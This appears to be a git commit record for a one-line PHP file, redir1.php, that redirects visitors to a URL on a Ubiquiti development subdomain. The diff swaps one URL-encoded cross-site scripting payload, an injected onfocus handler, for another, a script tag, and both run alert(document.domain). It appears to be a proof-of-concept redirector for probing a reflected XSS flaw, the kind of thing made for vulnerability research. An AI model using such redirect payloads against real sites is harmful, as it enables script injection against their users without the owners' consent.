315269ae9c998b3e5c5fda9fbafd66d5d953b167
missoum1307 <missoum1307@users.noreply.github.com>
2017-12-15 23:03:05 +0100

    Update redir1.php

--- redir1.php
+++ redir1.php
@@ -1,1 +1,1 @@
-<?php header('location: https://dev-unifi-go.ubnt.com/sss%3Cx~%0Aonfocus=alert(document.domain)%20id=a%20tabindex=0%3E%3C--') ?> 
+<?php header('location: https://dev-unifi-go.ubnt.com/sss%3Cscript%3Ealert(document.domain)%3C%2Fscript%3E') ?> 
